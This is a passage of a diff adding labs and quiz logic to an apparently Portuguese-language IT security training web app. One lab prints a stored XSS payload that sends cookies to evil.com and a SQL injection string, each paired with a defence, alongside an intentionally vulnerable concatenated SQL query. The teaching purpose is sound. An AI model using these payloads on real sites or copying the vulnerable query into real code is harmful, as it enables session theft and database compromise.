+            <button onclick="navigateToTopic('${prevTopic.id}')" class="px-4 py-3 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-left transition flex items-center gap-3">
+              <span class="text-cyan-400 font-bold">←</span>
+              <div>
+                <span class="block text-[10px] text-slate-500 uppercase">Anterior</span>
+                <span class="text-xs font-semibold text-slate-200">${prevTopic.number}. ${prevTopic.title}</span>
+              </div>
+            </button>
+          ` : `<div></div>`}
+
+          ${nextTopic ? `
+            <button onclick="navigateToTopic('${nextTopic.id}')" class="px-4 py-3 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-right transition flex items-center justify-end gap-3">
+              <div>
+                <span class="block text-[10px] text-slate-500 uppercase">Próximo Módulo</span>
+                <span class="text-xs font-semibold text-cyan-300">${nextTopic.number}. ${nextTopic.title}</span>
+              </div>
+              <span class="text-cyan-400 font-bold">→</span>
+            </button>
+          ` : `
+            <button onclick="navigateToHome()" class="px-5 py-3 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-xs font-bold">
+              🎉 Concluir Trilha e Voltar ao Dashboard
+            </button>
+          `}
+        </div>
+      `;
+
+      // Initialize dynamic labs if needed
+      if (topic.labType === 'crypto-hash') {
+        computeSHA256Lab('Portal da Tecnologia 2026');
+      }
+    }
+
+    function toggleTopicCompletion(topicId) {
+      const idx = appState.completedTopics.indexOf(topicId);
+      if (idx > -1) {
+        appState.completedTopics.splice(idx, 1);
+        saveState(true);
+      } else {
+        appState.completedTopics.push(topicId);
+        saveState(true);
+      }
+      const topic = SYLLABUS.find(t => t.id === topicId);
+      if (topic) renderTopicView(topic);
+    }
+
+    function answerQuiz(topicId, qIdx, selectedIdx) {
+      const topic = SYLLABUS.find(t => t.id === topicId);
+      const qItem = topic.quiz[qIdx];
+      const feedbackEl = document.getElementById(`quiz-feedback-${qIdx}`);
+      const isCorrect = selectedIdx === qItem.answer;
+
+      // Highlight options
+      qItem.options.forEach((_, i) => {
+        const btn = document.getElementById(`quiz-opt-${qIdx}-${i}`);
+        btn.classList.remove('border-emerald-500', 'bg-emerald-500/15', 'border-rose-500', 'bg-rose-500/15');
+        if (i === qItem.answer) {
+          btn.classList.add('border-emerald-500', 'bg-emerald-500/15', 'text-emerald-200');
+        } else if (i === selectedIdx && !isCorrect) {
+          btn.classList.add('border-rose-500', 'bg-rose-500/15', 'text-rose-200');
+        }
+      });
+
+      feedbackEl.classList.remove('hidden', 'bg-emerald-500/10', 'border-emerald-500/30', 'text-emerald-200', 'bg-rose-500/10', 'border-rose-500/30', 'text-rose-200');
+      if (isCorrect) {
+        feedbackEl.classList.add('bg-emerald-500/10', 'border', 'border-emerald-500/30', 'text-emerald-200');
+        feedbackEl.innerHTML = `<strong>✓ Resposta Correta!</strong> ${qItem.explanation}`;
+        if (!appState.completedTopics.includes(topicId)) {
+          appState.completedTopics.push(topicId);
+          saveState(true);
+          renderSidebar();
+        }
+      } else {
+        feedbackEl.classList.add('bg-rose-500/10', 'border', 'border-rose-500/30', 'text-rose-200');
+        feedbackEl.innerHTML = `<strong>✕ Quase lá!</strong> ${qItem.explanation}`;
+      }
+    }
+
+    // =========================================================================
+    // 6. LABORATÓRIOS INTERATIVOS CONTEXTUAIS (SIMULADORES)
+    // =========================================================================
+    function buildInteractiveLab(topic) {
+      switch (topic.labType) {
+        case 'terminal-os':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Clique nos comandos abaixo ou digite no terminal simulado para testar operações reais de <strong>Linux & Windows</strong>:</p>
+            <div class="flex flex-wrap gap-1.5 mb-3">
+              ${['ls -la', 'pwd', 'chmod 755 deploy.sh', 'ps aux', 'ipconfig /all', 'tasklist'].map(cmd => `
+                <button onclick="runOSTerminal('${cmd}')" class="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-cyan-500/20 border border-slate-700 text-xs font-mono text-cyan-300 transition">${cmd}</button>
+              `).join('')}
+            </div>
+            <div class="rounded-xl bg-slate-950 border border-slate-800 p-4 font-mono text-xs">
+              <div id="os-term-output" class="text-slate-300 space-y-1.5 mb-3 max-h-48 overflow-y-auto">
+                <div class="text-emerald-400">analista@portal-ti:~$ Bem-vindo ao Terminal Híbrido Linux/Windows. Selecione ou digite um comando.</div>
+              </div>
+              <div class="flex items-center gap-2 border-t border-slate-800 pt-2.5">
+                <span class="text-cyan-400">$</span>
+                <input id="os-term-input" onkeydown="if(event.key==='Enter') runOSTerminal(this.value)" type="text" placeholder="Digite um comando (ex: ls -la, pwd, ps aux)..."
+                  class="flex-1 bg-transparent text-white focus:outline-none" />
+                <button onclick="runOSTerminal(document.getElementById('os-term-input').value)" class="px-3 py-1 rounded bg-cyan-500 text-slate-950 font-bold">Executar</button>
+              </div>
+            </div>
+          `;
+
+        case 'excel-sandbox':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Simulador de Planilha Corporativa: teste fórmulas dinâmicas do Excel sobre a tabela de ativos abaixo:</p>
+            <div class="overflow-x-auto rounded-xl border border-slate-800 mb-3">
+              <table class="w-full text-xs font-mono text-left">
+                <thead class="bg-slate-950 text-slate-400">
+                  <tr><th class="p-2 border-r border-slate-800">#</th><th class="p-2 border-r border-slate-800">A (Ativo)</th><th class="p-2 border-r border-slate-800">B (Setor)</th><th class="p-2">C (Custo R$)</th></tr>
+                </thead>
+                <tbody class="divide-y divide-slate-800 text-slate-200">
+                  <tr><td class="p-2 border-r border-slate-800 text-slate-500">2</td><td class="p-2 border-r border-slate-800">Firewall NGFW</td><td class="p-2 border-r border-slate-800">Segurança</td><td class="p-2">15000</td></tr>
+                  <tr><td class="p-2 border-r border-slate-800 text-slate-500">3</td><td class="p-2 border-r border-slate-800">Servidor Linux</td><td class="p-2 border-r border-slate-800">Infra</td><td class="p-2">12000</td></tr>
+                  <tr><td class="p-2 border-r border-slate-800 text-slate-500">4</td><td class="p-2 border-r border-slate-800">Licença SIEM</td><td class="p-2 border-r border-slate-800">Segurança</td><td class="p-2">18000</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="evalExcelSim('SOMA')" class="px-3 py-1.5 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 font-mono text-xs">=SOMA(C2:C4)</button>
+              <button onclick="evalExcelSim('SOMASE')" class="px-3 py-1.5 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 font-mono text-xs">=SOMASE(B2:B4;"Segurança";C2:C4)</button>
+              <button onclick="evalExcelSim('CONTSE')" class="px-3 py-1.5 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 font-mono text-xs">=CONT.SE(B2:B4;"Segurança")</button>
+              <button onclick="evalExcelSim('SE')" class="px-3 py-1.5 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 font-mono text-xs">=SE(C2>14000;"Alto Custo";"Normal")</button>
+            </div>
+            <div id="excel-sim-result" class="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-cyan-300">
+              Clique em uma fórmula acima para ver o cálculo e a explicação passo a passo.
+            </div>
+          `;
+
+        case 'terminal-net':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Diagnóstico de Redes TCP/IP: execute ferramentas reais de conectividade e resolução de nomes:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              ${['ping gov.br', 'tracert 8.8.8.8', 'nslookup portal.tecnologia', 'netstat -an'].map(cmd => `
+                <button onclick="runNetSim('${cmd}')" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-indigo-500/20 border border-slate-700 text-xs font-mono text-indigo-300 transition">${cmd}</button>
+              `).join('')}
+            </div>
+            <pre id="net-sim-out" class="p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-emerald-400 overflow-x-auto">Pronto para diagnóstico. Selecione um comando de rede acima.</pre>
+          `;
+
+        case 'file-organizer':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Teste seus conhecimentos de identificação de extensões e estruturação de arquivos:</p>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+              <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                <span class="font-mono text-cyan-400 text-xs block mb-1">backup_logs_2026.tar.gz</span>
+                <p class="text-xs text-slate-400">Arquivo empacotado com <strong>tar</strong> e comprimido com <strong>gzip</strong> (padrão Linux/Unix).</p>
+              </div>
+              <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                <span class="font-mono text-amber-400 text-xs block mb-1">instalador_corporativo.msi</span>
+                <p class="text-xs text-slate-400">Pacote oficial do <strong>Microsoft Windows Installer</strong> para implantação de software.</p>
+              </div>
+            </div>
+          `;
+
+        case 'backup-simulator':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Simulador de Restauração de Desastres: clique nos cenários abaixo para ver quais fitas/arquivos de backup precisam ser restaurados:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="simBackup('INC')" class="px-3 py-1.5 rounded-lg bg-cyan-500/15 border border-cyan-500/30 text-cyan-300 text-xs font-semibold">Cenário 1: Full (Dom) + Incremental (Seg a Qua)</button>
+              <button onclick="simBackup('DIF')" class="px-3 py-1.5 rounded-lg bg-amber-500/15 border border-amber-500/30 text-amber-300 text-xs font-semibold">Cenário 2: Full (Dom) + Diferencial (Seg a Qua)</button>
+            </div>
+            <div id="backup-sim-out" class="p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">
+              Selecione um cenário acima para simular a recuperação de falha na quinta-feira.
+            </div>
+          `;
+
+        case 'sql-sandbox':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Sandbox SQL Interativo: execute consultas sobre a tabela <code class="text-cyan-300">usuarios_ti</code>:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="runSqlSim('ALL')" class="px-2.5 py-1 rounded-lg bg-slate-800 text-cyan-300 font-mono text-xs">SELECT * FROM usuarios_ti;</button>
+              <button onclick="runSqlSim('SEC')" class="px-2.5 py-1 rounded-lg bg-slate-800 text-emerald-300 font-mono text-xs">SELECT nome, cargo FROM usuarios_ti WHERE area = 'Cibersegurança';</button>
+              <button onclick="runSqlSim('COUNT')" class="px-2.5 py-1 rounded-lg bg-slate-800 text-amber-300 font-mono text-xs">SELECT area, COUNT(*) AS total FROM usuarios_ti GROUP BY area;</button>
+            </div>
+            <div id="sql-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-slate-200 overflow-x-auto">
+              Clique em uma query SQL acima para visualizar o resultado tabular.
+            </div>
+          `;
+
+        case 'lgpd-classifier':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Classificador LGPD: clique em cada exemplo para verificar seu enquadramento na Lei nº 13.709/2018:</p>
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-2 mb-3">
+              <button onclick="checkLgpdItem('biometria')" class="p-2.5 rounded-xl bg-slate-950 hover:border-rose-500/50 border border-slate-800 text-xs text-left">🖐️ Impressão digital / Reconhecimento facial</button>
+              <button onclick="checkLgpdItem('cpf')" class="p-2.5 rounded-xl bg-slate-950 hover:border-cyan-500/50 border border-slate-800 text-xs text-left">🪪 Nome completo, CPF e e-mail corporativo</button>
+              <button onclick="checkLgpdItem('anon')" class="p-2.5 rounded-xl bg-slate-950 hover:border-emerald-500/50 border border-slate-800 text-xs text-left">📊 Estatística agregada irreversível sem identificação</button>
+            </div>
+            <div id="lgpd-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">Selecione um item acima para ver a classificação legal.</div>
+          `;
+
+        case 'gov-simulator':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Simulador de Validação Gov.br: selecione o método de autenticação para descobrir o nível da conta:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="simGovLevel('BRONZE')" class="px-3 py-1.5 rounded-lg bg-amber-900/30 border border-amber-700/50 text-amber-300 text-xs">Cadastro básico com CPF</button>
+              <button onclick="simGovLevel('PRATA')" class="px-3 py-1.5 rounded-lg bg-slate-700/40 border border-slate-500/50 text-slate-200 text-xs">Login via Internet Banking credenciado</button>
+              <button onclick="simGovLevel('OURO')" class="px-3 py-1.5 rounded-lg bg-yellow-500/20 border border-yellow-500/40 text-yellow-300 text-xs">Biometria TSE ou Certificado ICP-Brasil</button>
+            </div>
+            <div id="gov-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">Clique em uma opção acima para verificar os privilégios do nível.</div>
+          `;
+
+        case 'ai-classifier':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Identifique o paradigma de Inteligência Artificial em cada aplicação real:</p>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
+              <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                <strong class="text-cyan-400 block mb-1">Filtro de Spam no E-mail</strong>
+                <span class="text-slate-400">Paradigma: <strong>Machine Learning Supervisionado</strong> (treinado com milhares de e-mails rotulados).</span>
+              </div>
+              <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                <strong class="text-emerald-400 block mb-1">Assistente de Código & Resumo de Textos</strong>
+                <span class="text-slate-400">Paradigma: <strong>IA Generativa / LLM (Arquitetura Transformer)</strong>.</span>
+              </div>
+            </div>
+          `;
+
+        case 'code-comparator':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Compare como a mesma lógica de verificação de acesso é escrita em <strong>Python, Java, C# e Apex</strong>:</p>
+            <div class="flex gap-2 mb-3">
+              ${['Python', 'Java', 'C#', 'Apex'].map(lang => `
+                <button onclick="showCodeLang('${lang}')" class="px-3 py-1 rounded-lg bg-slate-800 hover:bg-cyan-500/20 border border-slate-700 text-xs font-mono text-cyan-300">${lang}</button>
+              `).join('')}
+            </div>
+            <pre id="code-comp-out" class="p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-emerald-300 overflow-x-auto"># Python (Tipagem Dinâmica, Indentação)
+def verificar_acesso(nivel: int) -> str:
+    if nivel >= 3:
+        return "Acesso Autorizado"
+    return "Acesso Negado"</pre>
+          `;
+
+        case 'cid-triage':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Triagem de Incidentes CID: clique em um incidente para identificar o pilar principal violado:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="simCid('C')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-cyan-300 text-xs">Vazamento de planilha de senhas na Internet</button>
+              <button onclick="simCid('I')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-emerald-300 text-xs">Alteração não autorizada de saldo no banco de dados</button>
+              <button onclick="simCid('D')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-amber-300 text-xs">Queda do portal web por ataque DDoS</button>
+            </div>
+            <div id="cid-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">Selecione um cenário de incidente acima.</div>
+          `;
+
+        case 'risk-matrix':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Calculadora Interativa de Risco Cibernético (Probabilidade × Impacto):</p>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-3 text-xs">
+              <div>
+                <label class="block text-slate-400 mb-1">Probabilidade da Ameaça (1 a 5):</label>
+                <input id="risk-prob" type="range" min="1" max="5" value="4" oninput="calcRiskSim()" class="w-full accent-cyan-500" />
+              </div>
+              <div>
+                <label class="block text-slate-400 mb-1">Impacto no Negócio (1 a 5):</label>
+                <input id="risk-imp" type="range" min="1" max="5" value="5" oninput="calcRiskSim()" class="w-full accent-rose-500" />
+              </div>
+            </div>
+            <div id="risk-sim-out" class="p-3 rounded-xl bg-rose-500/15 border border-rose-500/40 text-xs text-rose-200 font-semibold">
+              Nível de Risco: 20 / 25 (CRÍTICO) — Ação recomendada: Mitigação imediata com controles técnicos.
+            </div>
+          `;
+
+        case 'firewall-rules':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Simulador de ACL (Access Control List) de Firewall Stateful: teste o tráfego abaixo:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="simFirewall('HTTPS')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-emerald-300 font-mono text-xs">Cliente Externo → DMZ Web (TCP 443)</button>
+              <button onclick="simFirewall('RDP')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-rose-300 font-mono text-xs">IP Externo → Servidor Interno (TCP 3389 RDP)</button>
+              <button onclick="simFirewall('TELNET')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-amber-300 font-mono text-xs">Admin → Roteador (TCP 23 Telnet)</button>
+            </div>
+            <div id="fw-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-slate-300">Selecione um pacote de rede para avaliar a regra do Firewall.</div>
+          `;
+
+        case 'crypto-hash':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Gerador de Hash Criptográfico <strong>SHA-256</strong> em Tempo Real (Web Crypto API): altere 1 caractere e observe o <em>efeito avalanche</em>:</p>
+            <input type="text" value="Portal da Tecnologia 2026" oninput="computeSHA256Lab(this.value)"
+              class="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-700 text-xs font-mono text-white mb-2 focus:border-cyan-500 focus:outline-none" />
+            <div class="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs break-all">
+              <span class="text-slate-500 block mb-1">Digest SHA-256 (256 bits / 64 hex chars):</span>
+              <span id="sha256-output" class="text-emerald-400">Calculando...</span>
+            </div>
+          `;
+
+        case 'cloud-shared':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Auditoria CSPM Simulada: clique para corrigir uma falha crítica de configuração em nuvem:</p>
+            <div id="cspm-box" class="p-4 rounded-xl bg-rose-500/10 border border-rose-500/40 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
+              <div class="text-xs">
+                <strong class="text-rose-400 block">⚠️ ALERTA CRÍTICO: Bucket S3 "financeiro-backups" com ACL Pública!</strong>
+                <span class="text-slate-300">Qualquer usuário na Internet pode listar e baixar os objetos armazenados.</span>
+              </div>
+              <button onclick="fixCspmBucket()" class="px-3 py-2 rounded-xl bg-emerald-500 text-slate-950 font-bold text-xs flex-shrink-0">Bloquear Acesso Público & Ativar SSE-KMS</button>
+            </div>
+          `;
+
+        case 'auth-flow':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Comparador Interativo de Protocolos de Identidade:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="simAuthProto('SAML')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-cyan-300 text-xs font-mono">SAML 2.0 (XML)</button>
+              <button onclick="simAuthProto('OAUTH')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-amber-300 text-xs font-mono">OAuth 2.0 (Autorização)</button>
+              <button onclick="simAuthProto('OIDC')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-emerald-300 text-xs font-mono">OpenID Connect (JWT)</button>
+            </div>
+            <div id="auth-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">Clique em um protocolo para visualizar seu token e caso de uso ideal.</div>
+          `;
+
+        case 'attack-defense':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Identifique o vetor de ataque e a contramedida imediata:</p>
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
+              <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                <strong class="text-rose-400 block mb-1">Payload: &lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</strong>
+                <span class="text-slate-400">Ataque: <strong>Stored XSS</strong>. Defesa: Sanitização/Escape de saída HTML e flag <code class="text-cyan-300">HttpOnly</code> nos cookies.</span>
+              </div>
+              <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                <strong class="text-amber-400 block mb-1">Payload: ' OR '1'='1' --</strong>
+                <span class="text-slate-400">Ataque: <strong>SQL Injection</strong>. Defesa: Uso obrigatório de <em>Prepared Statements</em>.</span>
+              </div>
+            </div>
+          `;
+
+        case 'sqli-defense':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Compare código vulnerável vs código seguro contra <strong>SQL Injection</strong>:</p>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-3 font-mono text-xs">
+              <div class="p-3 rounded-xl bg-rose-950/30 border border-rose-500/40">
+                <span class="text-rose-400 font-bold block mb-1">✕ Vulnerável (Concatenação)</span>
+                <code class="text-slate-300">sql = "SELECT * FROM users WHERE user = '" + input + "'";</code>
+              </div>
+              <div class="p-3 rounded-xl bg-emerald-950/30 border border-emerald-500/40">
+                <span class="text-emerald-400 font-bold block mb-1">✓ Seguro (Prepared Statement)</span>
+                <code class="text-slate-300">stmt = conn.prepare("SELECT * FROM users WHERE user = ?"); stmt.setString(1, input);</code>
+              </div>
+            </div>
+          `;
+
+        case 'soc-matcher':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Simulador de Arquitetura SOC: clique em uma necessidade operacional para descobrir a ferramenta ideal:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="simSoc('SIEM')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-indigo-300 text-xs">Correlacionar logs de 50 servidores e firewalls</button>
+              <button onclick="simSoc('PAM')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-rose-300 text-xs">Gravar sessão SSH de usuário root e rotacionar senha</button>
+              <button onclick="simSoc('WAF')" class="px-3 py-1.5 rounded-lg bg-slate-800 text-cyan-300 text-xs">Bloquear ataques SQLi e XSS contra uma API REST</button>
+            </div>
+            <div id="soc-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">Selecione um cenário operacional acima.</div>
+          `;
+
+        case 'nist-explorer':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Explorador Interativo das Funções do <strong>NIST Cybersecurity Framework (CSF)</strong>:</p>
+            <div class="flex flex-wrap gap-1.5 mb-3">
+              ${['Govern', 'Identify', 'Protect', 'Detect', 'Respond', 'Recover'].map(fn => `
+                <button onclick="simNist('${fn}')" class="px-3 py-1.5 rounded-lg bg-indigo-500/15 hover:bg-indigo-500/30 border border-indigo-500/30 text-indigo-300 text-xs font-semibold">${fn}</button>
+              `).join('')}
+            </div>
+            <div id="nist-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-slate-300">Clique em uma função do NIST CSF para ver exemplos práticos de controles.</div>
+          `;
+
+        case 'incident-order':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Playbook CSIRT: clique nas etapas em sequência para simular a resposta a um incidente:</p>
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
+              <div class="p-3 rounded-xl bg-slate-950 border border-cyan-500/30"><strong class="text-cyan-400">Passo 1:</strong> Triagem e confirmação do alerta no SIEM/EDR.</div>
+              <div class="p-3 rounded-xl bg-slate-950 border border-amber-500/30"><strong class="text-amber-400">Passo 2:</strong> Contenção (isolar host na VLAN de quarentena).</div>
+              <div class="p-3 rounded-xl bg-slate-950 border border-rose-500/30"><strong class="text-rose-400">Passo 3:</strong> Erradicação (remover persistência e fechar brecha).</div>
+              <div class="p-3 rounded-xl bg-slate-950 border border-emerald-500/30"><strong class="text-emerald-400">Passo 4:</strong> Recuperação limpa + Lições Aprendidas.</div>
+            </div>
+          `;
+
+        case 'digital-sig':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Validador Simulado de Assinatura Digital ICP-Brasil:</p>
+            <div class="flex flex-wrap gap-2 mb-3">
+              <button onclick="simSigCheck(true)" class="px-3 py-1.5 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs">Validar Documento Íntegro</button>
+              <button onclick="simSigCheck(false)" class="px-3 py-1.5 rounded-lg bg-rose-500/15 border border-rose-500/30 text-rose-300 text-xs">Simular Documento Adulterado (1 byte alterado)</button>
+            </div>
+            <div id="sig-sim-out" class="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-slate-300">Clique em um botão acima para verificar a validação criptográfica da assinatura.</div>
+          `;
+
+        case 'docker-audit':
+          return `
+            <p class="text-xs text-slate-300 mb-3">Auditoria de Segurança de Dockerfile: identifique as vulnerabilidades no manifesto abaixo:</p>
+            <pre class="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-slate-300 mb-2 overflow-x-auto">FROM ubuntu:latest
+ENV DB_PASSWORD=SuperSecret123!
+USER root
+EXPOSE 22 80</pre>
+            <div class="p-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-xs text-amber-200">
+              <strong>3 Falhas Detectadas:</strong> (1) Uso de imagem pesada <code class="text-white">ubuntu:latest</code> em vez de imagem mínima com tag fixa; (2) Senha hardcoded em <code class="text-white">ENV</code>; (3) Execução como <code class="text-white">USER root</code> e porta SSH (22) exposta no contêiner.
+            </div>
+          `;
+
+        default:
+          return '';
+      }
+    }
+
+    // =========================================================================
+    // 7. FUNÇÕES DE APOIO DOS LABORATÓRIOS INTERATIVOS
+    // =========================================================================
+    function runOSTerminal(cmd) {
+      const clean = (cmd || '').trim();
+      if (!clean) return;
+      const out = document.getElementById('os-term-output');
+      const input = document.getElementById('os-term-input');
+      if (input) input.value = '';
+
+      const responses = {
+        'ls -la': 'drwxr-xr-x 4 analista sec 4096 Nov 14 18:00 .\n-rwxr-xr-x 1 analista sec  512 Nov 14 17:55 deploy.sh\n-rw-r----- 1 root     sec 2048 Nov 14 17:50 config.env',
+        'pwd': '/home/analista/projetos-seguranca',
+        'chmod 755 deploy.sh': 'Permissões alteradas: rwxr-xr-x (Dono=7, Grupo=5, Outros=5).',
+        'ps aux': 'USER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nanalista  1420  0.4  1.2 /usr/bin/python3 monitor.py',
+        'ipconfig /all': 'Adaptador Ethernet:\n   Endereço IPv4. . . . . . . : 192.168.10.45\n   Máscara de Sub-rede . . . : 255.255.255.0\n   Gateway Padrão. . . . . . : 192.168.10.1',
+        'tasklist': 'Nome da Imagem                PID   Uso de Memória\n========================= ======== ==============\nSystem                           4        1.240 K\nmsedge.exe                    4812      145.300 K'
+      };
+
+      const reply = responses[clean] || `Comando '${clean}' executado. Dica: experimente os botões de comandos rápidos acima!`;
+      out.innerHTML += `<div class="text-cyan-300">$ ${clean}</div><pre class="text-slate-300 whitespace-pre-wrap mb-2">${reply}</pre>`;
+      out.scrollTop = out.scrollHeight;
+    }
+
+    function evalExcelSim(fn) {
+      const out = document.getElementById('excel-sim-result');
+      const map = {
+        'SOMA': 'Resultado: R$ 45.000,00 — Soma todos os valores numéricos de C2 até C4 (15000 + 12000 + 18000).',
+        'SOMASE': 'Resultado: R$ 33.000,00 — Soma apenas as linhas onde a coluna B é "Segurança" (15000 + 18000).',
+        'CONTSE': 'Resultado: 2 — Conta quantas células no intervalo B2:B4 atendem ao critério "Segurança".',
+        'SE': 'Resultado: "Alto Custo" — Como C2 (15000) > 14000 é VERDADEIRO, retorna o primeiro argumento.'
+      };
+      out.textContent = map[fn];
+    }
+
+    function runNetSim(cmd) {
+      const out = document.getElementById('net-sim-out');
+      const map = {
+        'ping gov.br': 'Disparando gov.br [161.148.164.31] com 32 bytes de dados:\nResposta de 161.148.164.31: bytes=32 tempo=18ms TTL=54\nResposta de 161.148.164.31: bytes=32 tempo=17ms TTL=54\nPacotes: Enviados = 2, Recebidos = 2, Perdidos = 0 (0% de perda)',
+        'tracert 8.8.8.8': 'Rastreando a rota para dns.google [8.8.8.8] com no máximo 30 saltos:\n  1    <1 ms   192.168.1.1 (Gateway Local)\n  2     6 ms   100.64.0.1 (Provedor ISP)\n  3    14 ms   8.8.8.8 (Destino alcançado)',
+        'nslookup portal.tecnologia': 'Servidor:  dns.corporativo.local\nAddress:  10.0.0.53\n\nNome:    portal.tecnologia\nAddress:  172.16.254.10',
+        'netstat -an': 'Proto  Endereço Local         Endereço Externo       Estado\nTCP    192.168.10.45:51422    161.148.164.31:443     ESTABLISHED\nTCP    0.0.0.0:443            0.0.0.0:0              LISTENING'
+      };
+      out.textContent = map[cmd];
+    }
+
+    function simBackup(type) {
+      const out = document.getElementById('backup-sim-out');
+      if (type === 'INC') {
+        out.innerHTML = '<strong class="text-cyan-400">Restauração Incremental (4 mídias necessárias):</strong> Você precisará restaurar o <strong>Full de Domingo</strong> + <strong>Incremental de Segunda</strong> + <strong>Incremental de Terça</strong> + <strong>Incremental de Quarta</strong>, nessa ordem exata.';
+      } else {
+        out.innerHTML = '<strong class="text-amber-400">Restauração Diferencial (apenas 2 mídias necessárias):</strong> Basta restaurar o <strong>Full de Domingo</strong> + o <strong>Diferencial de Quarta-feira</strong> (pois ele já acumula todas as alterações desde domingo).';
+      }
+    }
+
+    function runSqlSim(mode) {
+      const out = document.getElementById('sql-sim-out');
+      if (mode === 'ALL') {
+        out.innerHTML = `| id | nome          | area             | cargo             |\n|----|---------------|------------------|-------------------|\n| 1  | Ana Silva     | Cibersegurança   | Analista SOC      |\n| 2  | Carlos Souza  | Infraestrutura   | Admin Linux       |\n| 3  | Mariana Costa | Cibersegurança   | Engenheira AppSec |`;
+      } else if (mode === 'SEC') {
+        out.innerHTML = `| nome          | cargo             |\n|---------------|-------------------|\n| Ana Silva     | Analista SOC      |\n| Mariana Costa | Engenheira AppSec |`;
+      } else {
+        out.innerHTML = `| area             | total |\n|------------------|-------|\n| Cibersegurança   | 2     |\n| Infraestrutura   | 1     |`;
+      }
+    }
+
+    function checkLgpdItem(type) {
+      const out = document.getElementById('lgpd-sim-out');
+      const map = {
